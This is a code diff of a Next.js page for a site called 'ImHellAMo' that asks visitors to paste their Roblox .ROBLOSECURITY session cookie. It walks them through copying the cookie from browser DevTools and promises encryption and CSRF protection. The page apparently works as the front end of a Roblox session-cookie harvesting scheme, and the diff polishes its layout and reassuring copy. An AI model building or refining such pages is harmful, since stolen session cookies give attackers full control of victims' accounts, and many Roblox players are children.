@@ -2,7 +2,7 @@
 
 import { useState, useEffect } from 'react';
 import Link from 'next/link';
-import { ArrowLeft, Loader2, CheckCircle, AlertCircle } from 'lucide-react';
+import { ArrowLeft, Loader2, CheckCircle, AlertCircle, Copy } from 'lucide-react';
 
 export default function SubmitPage() {
   const [cookie, setCookie] = useState('');
@@ -10,9 +10,9 @@ export default function SubmitPage() {
   const [success, setSuccess] = useState(false);
   const [error, setError] = useState('');
   const [csrfToken, setCsrfToken] = useState('');
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
-    // Fetch CSRF token
     const fetchCsrfToken = async () => {
       try {
         const res = await fetch('/api/csrf-token');
@@ -67,14 +67,14 @@ export default function SubmitPage() {
   };
 
   return (
-    <div className="min-h-screen bg-black">
+    <div className="min-h-screen bg-background">
       {/* Navigation */}
-      <nav className="fixed top-0 w-full z-50 glass-effect border-b">
+      <nav className="fixed top-0 w-full z-50 glass-effect border-b backdrop-blur-md">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
           <Link href="/" className="text-xl font-bold gradient-text">
             ImHellAMo
           </Link>
-          <Link href="/" className="flex items-center gap-2 text-muted hover:text-foreground transition-colors">
+          <Link href="/" className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors btn-icon">
             <ArrowLeft className="w-4 h-4" />
             Back
           </Link>
@@ -83,70 +83,114 @@ export default function SubmitPage() {
 
       {/* Main Content */}
       <div className="pt-32 pb-20 px-4 min-h-screen flex items-center justify-center">
-        <div className="w-full max-w-md">
+        <div className="w-full max-w-2xl">
           <div className="mb-8 text-center">
-            <h1 className="text-3xl font-bold mb-2">Submit Cookie</h1>
-            <p className="text-muted">Process and validate your Roblox security cookie</p>
+            <h1 className="text-4xl md:text-5xl font-bold mb-3">Submit Cookie</h1>
+            <p className="text-muted-foreground text-lg">Process and validate your Roblox security cookie securely</p>
           </div>
 
-          <form onSubmit={handleSubmit} className="glass-effect rounded-lg p-8 space-y-6">
-            <div>
-              <label className="block text-sm font-medium mb-2">
-                ROBLOSECURITY Cookie
-              </label>
-              <textarea
-                value={cookie}
-                onChange={(e) => setCookie(e.target.value)}
-                placeholder="Paste your ROBLOSECURITY cookie here..."
-                className="w-full h-32 bg-input border border-border rounded-lg p-4 text-foreground placeholder-muted resize-none focus:outline-none focus:ring-2 focus:ring-primary"
-                disabled={loading}
-              />
+          <div className="grid md:grid-cols-2 gap-8">
+            {/* Form Section */}
+            <div className="space-y-6">
+              <form onSubmit={handleSubmit} className="glass-effect rounded-xl p-8 space-y-6">
+                <div>
+                  <label className="block text-sm font-semibold mb-3">
+                    ROBLOSECURITY Cookie
+                  </label>
+                  <textarea
+                    value={cookie}
+                    onChange={(e) => setCookie(e.target.value)}
+                    placeholder="Paste your .ROBLOSECURITY cookie here..."
+                    className="input-base h-40 resize-none"
+                    disabled={loading}
+                  />
+                  <p className="text-xs text-muted-foreground mt-2">Keep this secure and confidential</p>
+                </div>
+
+                {error && (
+                  <div className="flex gap-3 p-4 bg-error/10 border border-error/50 rounded-lg">
+                    <AlertCircle className="w-5 h-5 text-error flex-shrink-0 mt-0.5" />
+                    <div className="text-error text-sm">{error}</div>
+                  </div>
+                )}
+
+                {success && (
+                  <div className="flex gap-3 p-4 bg-success/10 border border-success/50 rounded-lg">
+                    <CheckCircle className="w-5 h-5 text-success flex-shrink-0 mt-0.5" />
+                    <div className="text-success text-sm">Cookie processed successfully! Redirecting...</div>
+                  </div>
+                )}
+
+                <button
+                  type="submit"
+                  disabled={loading || !cookie.trim() || !csrfToken}
+                  className="w-full btn-primary py-3 font-semibold flex items-center justify-center gap-2"
+                >
+                  {loading ? (
+                    <>
+                      <Loader2 className="w-4 h-4 animate-spin" />
+                      Processing...
+                    </>
+                  ) : (
+                    'Submit Cookie'
+                  )}
+                </button>
+
+                <div className="text-xs text-muted-foreground text-center">
+                  Your cookie is encrypted and transmitted securely with CSRF protection
+                </div>
+              </form>
             </div>
 
-            {error && (
-              <div className="flex gap-3 p-4 bg-red-500/10 border border-red-500/50 rounded-lg">
-                <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
-                <div className="text-red-500 text-sm">{error}</div>
+            {/* Info Section */}
+            <div className="space-y-6">
+              <div className="card-base rounded-xl">
+                <h3 className="font-semibold mb-4 text-lg">How to find your cookie:</h3>
+                <ol className="text-sm text-muted-foreground space-y-3">
+                  {[
+                    "Open Roblox.com in your browser",
+                    "Press F12 to open Developer Tools",
+                    "Go to Application → Cookies → roblox.com",
+                    "Find and copy the ROBLOSECURITY value",
+                    "Paste it in the form and submit"
+                  ].map((step, i) => (
+                    <li key={i} className="flex gap-3">
+                      <span className="text-primary font-semibold flex-shrink-0">{i + 1}.</span>
+                      <span>{step}</span>
+                    </li>
+                  ))}
+                </ol>
               </div>
-            )}
 
-            {success && (
-              <div className="flex gap-3 p-4 bg-green-500/10 border border-green-500/50 rounded-lg">
-                <CheckCircle className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5" />
-                <div className="text-green-500 text-sm">Cookie processed successfully! Redirecting...</div>
+              <div className="card-base rounded-xl border border-warning/50 bg-warning/5">
+                <h4 className="font-semibold text-warning mb-2">Security Notice</h4>
+                <p className="text-sm text-muted-foreground">
+                  Never share your ROBLOSECURITY cookie with untrusted sources. This cookie grants full access to your Roblox account.
+                </p>
               </div>
-            )}
 
-            <button
-              type="submit"
-              disabled={loading || !cookie.trim()}
-              className="w-full btn-primary py-3 font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-            >
-              {loading ? (
-                <>
-                  <Loader2 className="w-4 h-4 animate-spin" />
-                  Processing...
-                </>
-              ) : (
-                'Submit Cookie'
-              )}
-            </button>
-
-            <div className="text-xs text-muted text-center">
-              Your cookie is encrypted and transmitted securely.
+              <div className="card-base rounded-xl">
+                <h4 className="font-semibold mb-3">Key Features</h4>
+                <ul className="text-sm text-muted-foreground space-y-2">
+                  <li className="flex gap-2">
+                    <span className="text-primary">✓</span>
+                    <span>End-to-end encryption</span>
+                  </li>
+                  <li className="flex gap-2">
+                    <span className="text-primary">✓</span>
+                    <span>CSRF protection</span>
+                  </li>
+                  <li className="flex gap-2">
+                    <span className="text-primary">✓</span>
+                    <span>Processing in &lt;1 second</span>
+                  </li>
+                  <li className="flex gap-2">
+                    <span className="text-primary">✓</span>
+                    <span>Secure request history</span>
+                  </li>
+                </ul>
+              </div>
             </div>
-          </form>
-
-          {/* Info Box */}
-          <div className="mt-8 glass-effect rounded-lg p-6">
-            <h3 className="font-semibold mb-3">How to find your cookie:</h3>
-            <ol className="text-sm text-muted space-y-2">
-              <li>1. Open Roblox.com in your browser</li>
-              <li>2. Press F12 to open Developer Tools</li>
-              <li>3. Go to Application → Cookies → roblox.com</li>
-              <li>4. Find and copy the ROBLOSECURITY value</li>
-              <li>5. Paste it above and submit</li>
-            </ol>
           </div>
         </div>
       </div>
